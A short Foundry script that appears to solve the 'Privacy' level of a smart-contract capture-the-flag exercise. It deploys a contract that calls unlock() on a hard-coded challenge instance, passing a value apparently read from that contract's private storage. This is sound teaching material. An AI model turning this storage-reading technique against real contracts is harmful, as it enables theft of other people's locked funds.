//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyAttack {
  constructor(Privacy _privacyInstance) {
    _privacyInstance.unlock(bytes16(bytes32(0x20634ebcb14f31875a4025c0073c0bb5c3ed6199a9d574d8d7dd2b9ad2ddd9cc)));
    console.log("Locked: ",_privacyInstance.locked);
  }
}

contract PrivacySolution is Script {
Privacy privacyInstance = Privacy(0x831f83171c575a421330F29bA2eDeE9414fdc0C8);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    new PrivacyAttack(privacyInstance);
    vm.stopBroadcast();
  }
}